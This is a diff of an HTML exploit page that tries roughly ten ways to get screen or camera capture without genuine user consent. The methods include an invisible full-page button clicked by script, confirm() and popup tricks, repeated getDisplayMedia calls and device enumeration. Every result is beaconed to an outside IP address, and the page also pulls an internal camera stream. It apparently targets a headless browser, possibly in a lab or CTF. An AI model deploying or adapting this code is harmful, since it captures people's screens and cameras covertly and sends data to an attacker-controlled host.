@@ -3,158 +3,168 @@
 <head><title>C</title></head>
 <body style="margin:0;background:#111;">
 <img id="cam" src="http://10.133.7.5/stream" style="width:640px;height:480px;display:block;">
+<button id="btn" style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0.01;cursor:pointer;">Go</button>
 <script>
-var W='https://webhook.site/2c352a24-311b-4255-b02a-c77dbec3c3fe';
+var W='http://65.108.194.147:9999';
 function rpt(k,v){new Image().src=W+'?t='+k+'&v='+encodeURIComponent((''+v).substring(0,500))}
-rpt('ALIVE','1');
+rpt('ALIVE','1|sec='+window.isSecureContext+'|md='+(typeof navigator.mediaDevices));
 
 var gdmDone=false;
-function ua(){return navigator.userActivation?navigator.userActivation.isActive+'/'+navigator.userActivation.hasBeenActive:'?'}
 
-function tryGDM(label){
+// === APPROACH 1: getUserMedia with mediaSource='screen' (Firefox legacy API) ===
+setTimeout(function(){
     if(gdmDone)return;
-    if(!navigator.mediaDevices||!navigator.mediaDevices.getDisplayMedia)return;
-    rpt('GDM_TRY',label+'|ua='+ua());
-    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+    rpt('GUM_SCREEN','trying');
+    navigator.mediaDevices.getUserMedia({video:{mediaSource:'screen'}}).then(function(s){
         if(gdmDone)return;gdmDone=true;
-        rpt('GDM_OK',label+'|tracks='+s.getTracks().length);
+        rpt('GUM_SCREEN_OK','tracks='+s.getTracks().length);
         processStream(s);
     }).catch(function(e){
-        rpt('GDM_E',label+'|'+e.name.substring(0,20));
+        rpt('GUM_SCREEN_E',e.name+':'+e.message.substring(0,200));
     });
-}
+},200);
 
-// === APPROACH 1: window.open triggers activation? ===
+// === APPROACH 2: getUserMedia with mediaSource='window' ===
 setTimeout(function(){
     if(gdmDone)return;
-    rpt('A1_PRE',ua());
-    try{
-        var w=window.open('about:blank','_blank','width=1,height=1');
-        rpt('A1_POPUP','opened|ua='+ua());
-        if(w)w.close();
-        tryGDM('a1_popup');
-    }catch(e){rpt('A1_E',e.message)}
-},500);
+    rpt('GUM_WINDOW','trying');
+    navigator.mediaDevices.getUserMedia({video:{mediaSource:'window'}}).then(function(s){
+        if(gdmDone)return;gdmDone=true;
+        rpt('GUM_WINDOW_OK','tracks='+s.getTracks().length);
+        processStream(s);
+    }).catch(function(e){
+        rpt('GUM_WINDOW_E',e.name+':'+e.message.substring(0,200));
+    });
+},800);
 
-// === APPROACH 2: window.open then GDM inside timeout ===
+// === APPROACH 3: getUserMedia with mediaSource='browser' ===
 setTimeout(function(){
     if(gdmDone)return;
-    try{
-        var w=window.open('about:blank');
-        if(w){
-            rpt('A2_POPUP','ua='+ua());
-            w.close();
-            setTimeout(function(){tryGDM('a2_delayed')},100);
-        }
-    }catch(e){}
+    rpt('GUM_BROWSER','trying');
+    navigator.mediaDevices.getUserMedia({video:{mediaSource:'browser'}}).then(function(s){
+        if(gdmDone)return;gdmDone=true;
+        rpt('GUM_BROWSER_OK','tracks='+s.getTracks().length);
+        processStream(s);
+    }).catch(function(e){
+        rpt('GUM_BROWSER_E',e.name+':'+e.message.substring(0,200));
+    });
+},1400);
+
+// === APPROACH 4: getUserMedia with mediaSource='application' ===
+setTimeout(function(){
+    if(gdmDone)return;
+    rpt('GUM_APP','trying');
+    navigator.mediaDevices.getUserMedia({video:{mediaSource:'application'}}).then(function(s){
+        if(gdmDone)return;gdmDone=true;
+        rpt('GUM_APP_OK','tracks='+s.getTracks().length);
+        processStream(s);
+    }).catch(function(e){
+        rpt('GUM_APP_E',e.name+':'+e.message.substring(0,200));
+    });
 },2000);
 
-// === APPROACH 3: Multiple rapid synthetic events + GDM ===
-setTimeout(function(){
+// === APPROACH 5: btn.click() with getDisplayMedia in handler ===
+var btn=document.getElementById('btn');
+btn.addEventListener('click',function(e){
+    rpt('BTN','trusted='+e.isTrusted+'|active='+navigator.userActivation.isActive+'|had='+navigator.userActivation.hasBeenActive);
     if(gdmDone)return;
-    var el=document.createElement('div');
-    el.style.cssText='position:fixed;top:0;left:0;width:100%;height:100%';
-    document.body.appendChild(el);
-    // Fire rapid mouse events
-    el.dispatchEvent(new PointerEvent('pointerdown',{bubbles:true,pointerId:1,pointerType:'mouse',isPrimary:true}));
-    el.dispatchEvent(new PointerEvent('pointerup',{bubbles:true,pointerId:1,pointerType:'mouse',isPrimary:true}));
-    el.dispatchEvent(new MouseEvent('mousedown',{bubbles:true,button:0}));
-    el.dispatchEvent(new MouseEvent('mouseup',{bubbles:true,button:0}));
-    el.dispatchEvent(new MouseEvent('click',{bubbles:true,button:0}));
-    rpt('A3_EVENTS','ua='+ua());
-    tryGDM('a3_events');
-},3000);
+    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+        if(gdmDone)return;gdmDone=true;
+        rpt('GDM_BTN_OK','tracks='+s.getTracks().length);
+        processStream(s);
+    }).catch(function(e2){
+        rpt('GDM_BTN_E',e2.name+':'+e2.message.substring(0,100));
+    });
+});
+setTimeout(function(){btn.click()},500);
+setTimeout(function(){btn.click()},2500);
+setTimeout(function(){btn.click()},5000);
 
-// === APPROACH 4: focus + keyboard events ===
-setTimeout(function(){
-    if(gdmDone)return;
-    var inp=document.createElement('input');
-    inp.type='text';
-    inp.style.cssText='position:fixed;top:0;left:0;opacity:0.01';
-    document.body.appendChild(inp);
-    inp.focus();
-    inp.dispatchEvent(new KeyboardEvent('keydown',{key:'a',code:'KeyA',keyCode:65,bubbles:true}));
-    inp.dispatchEvent(new KeyboardEvent('keypress',{key:'a',code:'KeyA',keyCode:65,bubbles:true}));
-    inp.dispatchEvent(new KeyboardEvent('keyup',{key:'a',code:'KeyA',keyCode:65,bubbles:true}));
-    rpt('A4_KEYS','ua='+ua());
-    tryGDM('a4_keys');
-},4000);
-
-// === APPROACH 5: Touch events ===
+// === APPROACH 6: window.open for activation then getDisplayMedia ===
 setTimeout(function(){
     if(gdmDone)return;
     try{
-        var el=document.body;
-        el.dispatchEvent(new TouchEvent('touchstart',{bubbles:true,touches:[new Touch({identifier:1,target:el})]}));
-        el.dispatchEvent(new TouchEvent('touchend',{bubbles:true,changedTouches:[new Touch({identifier:1,target:el})]}));
-        rpt('A5_TOUCH','ua='+ua());
-        tryGDM('a5_touch');
-    }catch(e){rpt('A5_E',e.message)}
-},5000);
+        var w=window.open('about:blank','_blank','width=1,height=1');
+        rpt('POPUP','opened='+(!!w)+'|active='+navigator.userActivation.isActive);
+        if(w){w.close()}
+        if(navigator.userActivation.isActive){
+            navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+                if(gdmDone)return;gdmDone=true;
+                rpt('GDM_POPUP_OK','tracks='+s.getTracks().length);
+                processStream(s);
+            }).catch(function(e){rpt('GDM_POPUP_E',e.name)});
+        }
+    }catch(e){rpt('POPUP_ERR',e.message)}
+},3500);
 
-// === APPROACH 6: Notification.requestPermission ===
+// === APPROACH 7: confirm() for activation ===
 setTimeout(function(){
     if(gdmDone)return;
     try{
-        Notification.requestPermission().then(function(p){
-            rpt('A6_NOTIF',p+'|ua='+ua());
-            tryGDM('a6_notif');
-        });
-    }catch(e){rpt('A6_E',e.message)}
-},6000);
+        var r=confirm('share screen?');
+        rpt('CONFIRM','r='+r+'|active='+navigator.userActivation.isActive);
+        if(navigator.userActivation.isActive){
+            navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+                if(gdmDone)return;gdmDone=true;
+                rpt('GDM_CONFIRM_OK','tracks='+s.getTracks().length);
+                processStream(s);
+            }).catch(function(e){rpt('GDM_CONFIRM_E',e.name)});
+        }
+        btn.click();
+    }catch(e){rpt('CONFIRM_ERR',e.message)}
+},6500);
 
-// === APPROACH 7: Create trusted event via Selection API ===
-setTimeout(function(){
-    if(gdmDone)return;
-    try{
-        // Select text and copy - might trigger activation
-        var el=document.createElement('textarea');
-        el.value='test';
-        document.body.appendChild(el);
-        el.select();
-        var result=document.execCommand('selectAll');
-        rpt('A7_SELECT',result+'|ua='+ua());
-        // Try paste/copy
-        result=document.execCommand('copy');
-        rpt('A7_COPY',result+'|ua='+ua());
-        tryGDM('a7_copy');
-    }catch(e){rpt('A7_E',e.message)}
-},7000);
-
-// === APPROACH 8: alert/confirm/prompt (blocked in headless but might trigger activation) ===
-setTimeout(function(){
-    if(gdmDone)return;
-    try{
-        // confirm() might trigger activation even if auto-dismissed
-        var r=confirm('x');
-        rpt('A8_CONFIRM',r+'|ua='+ua());
-        tryGDM('a8_confirm');
-    }catch(e){rpt('A8_E',e.message)}
-},8000);
-
-// === APPROACH 9: requestFullscreen ===
-setTimeout(function(){
-    if(gdmDone)return;
-    try{
-        document.body.requestFullscreen().then(function(){
-            rpt('A9_FS','ok|ua='+ua());
-            tryGDM('a9_fs');
-        }).catch(function(e){
-            rpt('A9_FS_E',e.message+'|ua='+ua());
-            tryGDM('a9_fs_fail');
-        });
-    }catch(e){rpt('A9_E',e.message)}
-},9000);
-
-// === APPROACH 10: Direct GDM retries every 5s ===
+// === APPROACH 8: Direct GDM retries ===
 var retryN=0;
 function retryGDM(){
     retryN++;
-    if(gdmDone||retryN>10)return;
-    tryGDM('retry'+retryN);
-    setTimeout(retryGDM,5000);
+    if(gdmDone||retryN>15)return;
+    navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){
+        if(gdmDone)return;gdmDone=true;
+        rpt('GDM_R_OK',retryN+'|tracks='+s.getTracks().length);
+        processStream(s);
+    }).catch(function(e){
+        if(retryN<=2||retryN%5==0)rpt('GDM_R_E',retryN+'|'+e.name);
+    });
+    setTimeout(retryGDM,4000);
 }
-retryGDM();
+setTimeout(retryGDM,300);
+
+// === APPROACH 9: mozGetUserMedia (prefixed) ===
+setTimeout(function(){
+    if(gdmDone)return;
+    if(navigator.mozGetUserMedia){
+        rpt('MOZ_GUM','exists');
+        navigator.mozGetUserMedia({video:{mediaSource:'screen'}},function(s){
+            if(gdmDone)return;gdmDone=true;
+            rpt('MOZ_GUM_OK','tracks='+s.getTracks().length);
+            processStream(s);
+        },function(e){
+            rpt('MOZ_GUM_E',e.name+':'+e.message.substring(0,100));
+        });
+    }else{
+        rpt('MOZ_GUM','undefined');
+    }
+},4500);
+
+// === APPROACH 10: enumerate devices then getUserMedia with deviceId ===
+setTimeout(function(){
+    if(gdmDone)return;
+    navigator.mediaDevices.enumerateDevices().then(function(devs){
+        var info=devs.map(function(d){return d.kind+':'+d.deviceId.substring(0,8)+':'+d.label.substring(0,30)}).join('|');
+        rpt('DEVS',info||'none');
+        // Try to capture any video device
+        var vid=devs.filter(function(d){return d.kind==='videoinput'});
+        if(vid.length>0){
+            rpt('VIDDEV',vid[0].deviceId+':'+vid[0].label);
+            navigator.mediaDevices.getUserMedia({video:{deviceId:{exact:vid[0].deviceId}}}).then(function(s){
+                if(gdmDone)return;gdmDone=true;
+                rpt('GUM_DEV_OK','tracks='+s.getTracks().length);
+                processStream(s);
+            }).catch(function(e){rpt('GUM_DEV_E',e.name+':'+e.message.substring(0,100))});
+        }
+    });
+},7500);
 
 function processStream(stream){
     rpt('STREAM','tracks='+stream.getTracks().length);
